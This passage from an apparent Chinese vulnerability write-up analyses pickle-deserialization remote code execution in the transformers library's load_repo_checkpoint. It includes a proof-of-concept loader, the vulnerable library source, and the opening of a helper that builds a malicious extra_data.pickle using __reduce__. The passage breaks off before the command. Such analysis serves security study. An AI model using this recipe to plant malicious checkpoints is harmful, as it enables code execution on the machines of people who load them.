+&lt;p&gt;在被加载的时候就能够执⾏任意命令，但是这⾥我们只是为了证明能够执⾏⽽不想产⽣实际危害，所以我们只是弹 出了⼀个计算器：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241028101410376.png&#34; alt=&#34;image-20241028101410376&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞原理分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞原理分析&#34;&gt;#&lt;/a&gt; 漏洞原理分析&lt;/h2&gt;
+&lt;p&gt;从⼤的流程上来说，就是 transformers 允许从检查点恢复预训练的⼀些进度，⽽所谓的 checkpoint 检查点其实 就是⼀个⽂件夹，结构⼤概是这样⼦的：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241028101443835.png&#34; alt=&#34;image-20241028101443835&#34;&gt;&lt;/p&gt;
+&lt;p&gt;⽂件夹名称 checkpoint 是约定的固定的名称，下⾯的两个⽂件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;weights.h5 ：模型的权重⽂件，必须要是跟正在使⽤的模型架构对应的的权重，否则的话加载权重这⼀步就 会抛异常，⾛不到执⾏命令那⼀步，所以利⽤时要知道使⽤的是哪个模型架构，因为不同的架构可能有不同的 神经⽹络层数之类的&lt;/li&gt;
+&lt;li&gt;extra_data.pickle ：这个⽂件的初衷是存放⼀些元数据信息，只是保存⽅式选择的⽅式选择得不太合适， 为了⽅便直接⽤ pickle.dump 来保存，输出的是⼀个序列化的⽂件，⽽模型加载的时候要读取对应的元数据 信息，就会使⽤ pickle.load (f) 来加载这个⽂件，从⽽利⽤反序列化漏洞进⾏ RCE。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;下⾯来看⼀下 poc 代码，追⼀下源代码看看漏洞到底是怎么产⽣的，可以看到是在 model.load_repo_checkpoint ⽅法读取了有问题的 checkpoint ：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from tensorflow.keras.optimizers import Adam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from transformers import TFAutoModel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 这个模型还是有些⼤的，下载可能会花⼀些时间...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # https://huggingface.co/google-bert/bert-base-uncased/tree/main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model = TFAutoModel.from_pretrained(&amp;#x27;bert-base-uncased&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 把参数修改为checkpoint所在的仓库的路径，注意路径要正确&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model.load_repo_checkpoint(&amp;#x27;rce-checkpoint&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;让我们跟进去代码看⼀下，这个⽅法完整的实现是下⾯这样⼦，可以看到逻辑⽐较简单，下⾯我们将⼀段⼀段的分 析它：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def load_repo_checkpoint(self, repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Loads a saved checkpoint (model weights and optimizer state) from a repo. Returns &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the current epoch count when&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  the checkpoint was made.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Args:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  repo_path_or_name (`str`):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Can either be a repository name for your &amp;#123;object&amp;#125; in the Hub or a path to &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a local folder (in which case&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  the repository will have the name of that local folder).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Returns:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            `dict`: A dictionary of extra metadata from the checkpoint, most commonly an &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;epoch&amp;quot; count.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if getattr(self, &amp;quot;optimizer&amp;quot;, None) is None:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise RuntimeError(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;quot;Checkpoint loading failed as no optimizer is attached to the model. &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;quot;This is most likely caused by the model not being compiled.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if os.path.isdir(repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo_path_or_name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # If this isn&amp;#x27;t a local path, check that the remote repo exists and has a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint in it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo_files = list_repo_files(repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for file in (&amp;quot;checkpoint/weights.h5&amp;quot;, &amp;quot;checkpoint/extra_data.pickle&amp;quot;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if file not in repo_files:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    raise FileNotFoundError(f&amp;quot;Repo &amp;#123;repo_path_or_name&amp;#125; does not contain &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint file &amp;#123;file&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo = Repository(repo_path_or_name.split(&amp;quot;/&amp;quot;)[-1], &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clone_from=repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo.local_dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Now make sure the repo actually has a checkpoint in it.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        checkpoint_dir = os.path.join(local_dir, &amp;quot;checkpoint&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        weights_file = os.path.join(checkpoint_dir, &amp;quot;weights.h5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(weights_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file weights.h5 in repo &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        extra_data_file = os.path.join(checkpoint_dir, &amp;quot;extra_data.pickle&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(extra_data_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file extra_data.pickle in &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;repo &amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Assuming the repo is real and we got a checkpoint, load the weights and the &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;optimizer state into the model.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # The optimizer state includes the iteration count, so learning rate schedules &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;should resume as normal too.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.load_weights(weights_file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        with open(extra_data_file, &amp;quot;rb&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            extra_data = pickle.load(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.optimizer.set_weights(extra_data[&amp;quot;optimizer_state&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Finally, return the epoch number from the checkpoint. This isn&amp;#x27;t a property of &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the model, so we can&amp;#x27;t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # set it directly, but the user can pass it to fit().&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return &amp;#123;&amp;quot;epoch&amp;quot;: extra_data[&amp;quot;epoch&amp;quot;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;⾸先这部分是对模型⾃身的设置进⾏检查，这就要求模型使⽤的时候必须要配置了 optimizer：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if getattr(self, &amp;quot;optimizer&amp;quot;, None) is None:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          raise RuntimeError(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;quot;Checkpoint loading failed as no optimizer is attached to the model. &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;quot;This is most likely caused by the model not being compiled.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;所以我们的 poc 代码⾥也为模型配置了 optimizer：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;紧接着对传⼊的⽂件夹的合法性进⾏检查，⽐如必须是⼀个⽬录⽂件，必须存在 checkpoint/weights.h5 和 checkpoint/extra_data.pickle 这两个⽂件：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;        if os.path.isdir(repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo_path_or_name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # If this isn&amp;#x27;t a local path, check that the remote repo exists and has a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint in it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo_files = list_repo_files(repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for file in (&amp;quot;checkpoint/weights.h5&amp;quot;, &amp;quot;checkpoint/extra_data.pickle&amp;quot;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if file not in repo_files:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    raise FileNotFoundError(f&amp;quot;Repo &amp;#123;repo_path_or_name&amp;#125; does not contain &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint file &amp;#123;file&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo = Repository(repo_path_or_name.split(&amp;quot;/&amp;quot;)[-1], &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clone_from=repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo.local_dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Now make sure the repo actually has a checkpoint in it.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        checkpoint_dir = os.path.join(local_dir, &amp;quot;checkpoint&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        weights_file = os.path.join(checkpoint_dir, &amp;quot;weights.h5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(weights_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file weights.h5 in repo &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        extra_data_file = os.path.join(checkpoint_dir, &amp;quot;extra_data.pickle&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(extra_data_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file extra_data.pickle in &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;repo &amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;再然后，开始读取： extra_data.pickle 反序列化，就来到了我们熟悉的 pickle.load (f) 环节，在这⼀步，产⽣ 了 RCE&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;with open(extra_data_file, &amp;quot;rb&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; extra_data = pickle.load(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; self.optimizer.set_weights(extra_data[&amp;quot;optimizer_state&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # Finally, return the epoch number from the checkpoint. This isn&amp;#x27;t a property of &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the model, so we can&amp;#x27;t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # set it directly, but the user can pass it to fit().&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; return &amp;#123;&amp;quot;epoch&amp;quot;: extra_data[&amp;quot;epoch&amp;quot;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;让我们来看⼀下这个 extra_data.pickle ⽂件是如何⽣成的，这⾥定义了⼀个类，然后为这个类创建了⼀个对象 并 dump 到了硬盘上，在这个类上有⼀个特殊的 &lt;strong&gt;reduce&lt;/strong&gt; ⽅法，在 pickle 的规范约定中，反序列化时会调⽤类上 的__reduce__⽅法，所以就 RCE：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def generate_extra_data_pickle(filepath, command):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;⽣成extra_data.pickle⽂件，这个⽂件被加载的时候会执⾏给定的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :param filepath: extra_data.pickle⽂件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :param command: 要执⾏的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :return:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; class CommandExecute:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在 pickle.load(f) 的时候，此处的命令会被执⾏&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :return:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  